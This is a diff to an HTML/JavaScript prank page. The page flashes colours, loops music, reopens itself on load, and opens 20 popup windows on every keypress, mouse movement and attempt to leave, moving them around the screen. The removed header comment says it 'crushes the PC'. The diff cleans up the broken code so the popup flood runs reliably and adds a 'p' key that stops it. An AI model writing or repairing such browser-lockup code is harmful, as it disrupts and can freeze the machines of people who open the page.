@@ -1,138 +1,142 @@
-<!-- Source: http://jsenabled.blogspot.com/2011/09/9-funniest-javascript-effects.html -->
-<!-- Opens lots of windows in the browser and crushes the PC. -->
-
 <html>
 <head>
     <title>HaAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHAHHAAHHAHAAHHAHAHAHAHAH</title>
     <script>
+        let scriptActive = true; // Flag to control the script's execution
+
         activ = window.setInterval("Farbe()", 100);
-        farbe=1;
-        
+        farbe = 1;
+
         function Farbe() {
-            if(farbe==1) {
-                document.bgColor="000000";
-                farbe=2;
-            }else {
-                document.bgColor="FF0000";
-                farbe=1;
+            if (!scriptActive) return; // Stop the script if it's not active
+            if (farbe == 1) {
+                document.bgColor = "000000";
+                farbe = 2;
+            } else {
+                document.bgColor = "FF0000";
+                farbe = 1;
             }
-            
         }
 
-        function erneut(){
-            window.open(self.location,'');
+        function erneut() {
+            if (!scriptActive) return; // Stop opening new windows if it's not active
+            window.open(self.location, '');
         }
-        
+
         window.onload = erneut;
-    </script>#  <script>
-        const title = document.getElementById('title')
-        const body = document.getElementById('bodyEl')
 
-        const music = new Audio('music.mp3')
+        const title = document.getElementById('title');
+        const body = document.getElementById('bodyEl');
 
-        let nextAn = 1
-        let indexN = 0
-        let wordlist = ['HA', 'YOU', 'ARE', 'STUPID']
-        let popups = [window]
+        const music = new Audio('music.mp3');
 
-        function getRandomCordinats(){
-            return [Math.floor(Math.random() * (screen.width-100 - 0) + 0), Math.floor(Math.random() * (screen.height-100 - 0) + 0)]
+        let nextAn = 1;
+        let indexN = 0;
+        let wordlist = ['HA', 'YOU', 'ARE', 'STUPID'];
+        let popups = [window];
+
+        function getRandomCordinates() {
+            return [Math.floor(Math.random() * (screen.width - 100 - 0) + 0), Math.floor(Math.random() * (screen.height - 100 - 0) + 0)];
         }
 
-        setInterval(()=>{
-            if (popups.length!=0){
-                for (let i = 0; i < popups.length;i++){
-                    let xy = getRandomCordinats()
-                    popups[i].moveTo(xy[0], xy[1])
-                    popups[i].focus()
+        setInterval(() => {
+            if (popups.length != 0) {
+                for (let i = 0; i < popups.length; i++) {
+                    let xy = getRandomCordinates();
+                    popups[i].moveTo(xy[0], xy[1]);
+                    popups[i].focus();
                 }
             }
-        }, 50)/*make this lower later*/
+        }, 50);
 
-        setInterval(()=>{
-            title.textContent = wordlist[indexN]
-            if(nextAn==1){
-                title.style.color = 'black'
-                body.style.backgroundColor = 'white'
-                nextAn = 2
-            }else{
-                title.style.color = 'white'
-                body.style.backgroundColor = 'black'
-                nextAn = 1
+        setInterval(() => {
+            if (!scriptActive) return; // Stop updating the title if it's not active
+            title.textContent = wordlist[indexN];
+            if (nextAn == 1) {
+                title.style.color = 'black';
+                body.style.backgroundColor = 'white';
+                nextAn = 2;
+            } else {
+                title.style.color = 'white';
+                body.style.backgroundColor = 'black';
+                nextAn = 1;
             }
             if (indexN == 3) {
-                indexN = 0
-            }else{
-                indexN++
+                indexN = 0;
+            } else {
+                indexN++;
             }
-        }, 400)
+        }, 400);
 
-        function createNewPopUp(){
-            let newWindow = window.open('index.html','', 'width=500px height=350px')
-            popups.push(newWindow)
-	    setTimeout()
+        function createNewPopUp() {
+            if (!scriptActive) return; // Stop opening new popups if it's not active
+            let newWindow = window.open('index.html', '', 'width=500px height=350px');
+            popups.push(newWindow);
         }
 
-        window.addEventListener('beforeunload', (e)=>{
-            for (let i = 0; i<20; i++){
-                createNewPopUp()
-		setTimeout()
+        window.addEventListener('beforeunload', (e) => {
+            if (!scriptActive) return; // Prevent popup creation if it's not active
+            for (let i = 0; i < 20; i++) {
+                createNewPopUp();
             }
 
-            e.preventDefault()
-            e.returnValue = ''
-        })
-        
-        window.addEventListener('load', ()=>{
-            let h = window.innerHeight
-            title.style.marginTop = (h/2 - 120).toString() + "px"
-        })
+            e.preventDefault();
+            e.returnValue = '';
+        });
 
-        window.addEventListener('resize', ()=>{
-            let h = window.innerHeight
-            title.style.marginTop = (h/2 - 120).toString() + "px"
-        })
+        window.addEventListener('load', () => {
+            let h = window.innerHeight;
+            title.style.marginTop = (h / 2 - 120).toString() + "px";
+        });
 
-        document.addEventListener('click', ()=>{
-            music.play()
-        })
+        window.addEventListener('resize', () => {
+            let h = window.innerHeight;
+            title.style.marginTop = (h / 2 - 120).toString() + "px";
+        });
 
-        document.addEventListener('mouseenter', ()=>{
-            music.play()
-        })
+        document.addEventListener('click', () => {
+            if (!scriptActive) return; // Stop playing music if it's not active
+            music.play();
+        });
 
-        document.addEventListener('keydown', (e)=>{
-            music.play()
-            for (let i = 0; i<20; i++){
-                createNewPopUp()
-		setTimeout()
+        document.addEventListener('mouseenter', () => {
+            if (!scriptActive) return; // Stop playing music if it's not active
+            music.play();
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (!scriptActive) return; // Stop all actions if the script is not active
+            music.play();
+            for (let i = 0; i < 20; i++) {
+                createNewPopUp();
             }
-            e.preventDefault()
-        })
+            e.preventDefault();
+        });
 
-	document.addEventListener('keydown', (e)=>{
-            if (keyPressed === 'p') {
-        	throw new Error("Virus has stopped executing: force closed button detected!")
-	}
-        })
-
-	 document.addEventListener('mousemove', (e)=>{
-            music.play()
-            for (let i = 0; i<20; i++){
-                createNewPopUp()
-		setTimeout()
+        // New event listener for the "p" key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'p') {
+                scriptActive = false; // Disable the script when "p" is pressed
+                alert('The script has been stopped!');
             }
-            e.preventDefault()
-        })
+        });
 
-        music.addEventListener('ended', ()=>{
-            music.play()
-        })
+        document.addEventListener('mousemove', (e) => {
+            if (!scriptActive) return; // Stop if the script is not active
+            music.play();
+            for (let i = 0; i < 20; i++) {
+                createNewPopUp();
+            }
+            e.preventDefault();
+        });
 
-        
+        music.addEventListener('ended', () => {
+            if (!scriptActive) return; // Stop looping the music if the script is not active
+            music.play();
+        });
     </script>
 </head>
 <body>
-    <h1>IMAGINE</h1>
+    <h1 id="title">IMAGINE</h1>
 </body>
 </html>
